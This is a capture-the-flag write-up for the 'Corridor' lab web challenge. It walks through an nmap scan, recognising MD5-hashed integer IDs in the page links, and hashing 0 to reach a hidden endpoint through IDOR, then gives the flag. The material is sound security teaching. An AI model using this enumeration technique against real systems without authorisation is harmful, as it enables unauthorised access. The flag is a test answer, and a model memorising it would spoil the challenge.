# Corridor Challenge Writeup

## Overview

The goal of this challenge was to explore a web application for possible IDOR (Insecure Direct Object Reference) vulnerabilities and discover hidden endpoints by analyzing hexadecimal values present in URLs.

Target:

```bash
10.48.177.89
```

---

# Step 1: Initial Enumeration

Start by scanning the target using Nmap.

```bash
sudo nmap -sC -sV -Pn -A 10.48.177.89
```

## Nmap Output

```text
PORT   STATE SERVICE VERSION
80/tcp open  http    Werkzeug httpd 2.0.3 (Python 3.10.2)

http-title: Corridor
```

### Observation

* Only port 80 was open.
* The website title was:

  ```text
  Corridor
  ```

This indicated a web-based challenge.

---

# Step 2: Visit the Website

Open the target in a browser:

```text
http://10.48.177.89
```

The page displayed a corridor image with clickable doors.

---

# Step 3: Inspect the Page Source

Viewing the page source revealed multiple URL endpoints:

```html
href="c4ca4238a0b923820dcc509a6f75849b"
href="c81e728d9d4c2f636f067f89cc14862c"
href="eccbc87e4b5ce2fe28308fd9f2a7baf3"
```

These values looked like hashes.

---

# Step 4: Identify the Hash Type

The hashes were recognized as MD5 hashes.

Examples:

| Number | MD5 Hash                         |
| ------ | -------------------------------- |
| 1      | c4ca4238a0b923820dcc509a6f75849b |
| 2      | c81e728d9d4c2f636f067f89cc14862c |
| 3      | eccbc87e4b5ce2fe28308fd9f2a7baf3 |

This can be verified using:

```bash
echo -n 1 | md5sum
```

Output:

```text
c4ca4238a0b923820dcc509a6f75849b
```

---

# Step 5: Understand the Hint

Challenge hint:

> "Can you find your way back to where you came?"

The corridor links started from:

```text
md5(1)
```

So the logical step was to go backward and test:

```text
md5(0)
```

---

# Step 6: Generate MD5 of 0

Generate the hash:

```bash
echo -n 0 | md5sum
```

Output:

```text
cfcd208495d565ef66e7dff9f98764da
```

---

# Step 7: Access the Hidden Endpoint

Visit:

```text
http://10.48.177.89/cfcd208495d565ef66e7dff9f98764da
```

The page revealed the flag.

---

# Flag

```text
flag{2477ef02448ad9156661ac40a6b8862e}
```

---

# What We Learned

## IDOR (Insecure Direct Object Reference)

This challenge demonstrates how predictable identifiers can expose hidden resources.

The application relied on MD5 hashes of integers as URL paths:

```text
md5(1)
md5(2)
md5(3)
```

Since the pattern was predictable, an attacker could enumerate other values such as:

```text
md5(0)
```

and access unintended content.

---

# Key Takeaways

* Always inspect URL structures carefully.
* Hashes are not secure if generated from predictable input.
* IDOR vulnerabilities often occur due to weak access control.
* Enumeration is a powerful technique in web exploitation.

---

# Final Flag

```text
flag{2477ef02448ad9156661ac40a6b8862e}
```
